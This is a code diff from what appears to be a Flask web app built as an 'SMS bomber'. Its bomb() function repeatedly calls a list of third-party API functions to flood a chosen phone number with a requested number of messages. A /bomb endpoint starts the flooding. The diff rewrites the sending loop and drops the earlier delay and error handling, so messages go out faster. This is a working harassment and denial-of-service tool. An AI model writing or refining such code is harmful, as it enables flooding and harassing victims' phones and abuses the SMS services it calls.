@@ -1036,34 +1036,29 @@ def bomb(phone_number, amount):
     status_data["failed"] = []
     status_data["running"] = True
 
-    if not api_functions:
-        print("No API functions found (functions starting with 'call_' and ending with '_api').")
-        status_data["running"] = False
-        return
+    total_apis = len(api_functions)
 
-    message_goal = amount
-    
-    while status_data["sent"] < message_goal:
-        for api_func in api_functions:
-            if status_data["sent"] >= message_goal:
-                break
-
-            try:
-                if api_func(phone_number):
-                    status_data["sent"] += 1
-                    # You can add print statements here if you want server-side console logs
-                    # print(f"SMS sent successfully via {api_func.__name__}. Total sent: {status_data['sent']}/{message_goal}")
-                else:
-                    status_data["failed"].append(api_func.__name__)
-                    # print(f"SMS failed via {api_func.__name__}.")
-                time.sleep(0.3)
-            except Exception: # Catching all exceptions
-                status_data["failed"].append(api_func.__name__)
-                # print(f"Exception calling {api_func.__name__}: {e}")
-                time.sleep(0.3)
+    if amount <= total_apis:
+        # Just call the first `amount` APIs once
+        for api in api_functions[:amount]:
+            success = api(phone_number)
+            if success:
+                status_data["sent"] += 1
+            else:
+                status_data["failed"].append(api.__name__)
+    else:
+        index = 0
+        while status_data["sent"] < amount:
+            api = api_functions[index % total_apis]
+            success = api(phone_number)
+            if success:
+                status_data["sent"] += 1
+            else:
+                status_data["failed"].append(api.__name__)
+            index += 1
 
     status_data["running"] = False
-
+    
 @app.route('/bomb', methods=['POST'])
 def start_bombing():
     data = request.get_json()
